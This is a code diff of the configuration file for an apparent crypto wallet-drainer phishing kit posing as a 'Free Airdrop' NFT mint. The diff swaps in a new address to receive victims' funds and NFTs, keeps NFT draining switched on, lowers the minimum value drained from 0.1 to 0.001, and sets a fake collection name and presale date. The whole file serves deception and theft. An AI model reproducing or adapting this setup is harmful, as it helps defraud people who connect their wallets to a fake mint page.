@@ -1,6 +1,6 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0xA9b825bCD7cae900E8b6fE177709750C388E9cfF',
   collectionInfo = {
-    name: 'THE NFT WORLD',
+    name: 'PINATA NFTS',
     socialMedia: {
       discord: 'https://discord.gg',
       twitter: 'https://twitter.com',
@@ -10,7 +10,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
 
   indexPageInfo = {
     backgroundImage: 'background.jpg',
-    title: '{name}',
+    title: '{PINATA NFTS}',
     underTitle: 'Free Airdrop',
   },
 
@@ -26,15 +26,15 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
 
   drainNftsInfo = {
     active: true,
-    minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    minValue: 0.001,
+    nftReceiveAddress: '0xA9b825bCD7cae900E8b6fE177709750C388E9cfF',
   },
 
   customStrings = {
     title: 'MINT {name}',
     connectButton: 'Connect wallet',
     transferButton: 'Mint now',
-    dateString: 'Pre sale available {date}',
+    dateString: 'Pre sale available {15/3/2023}',
   }
   
 if (
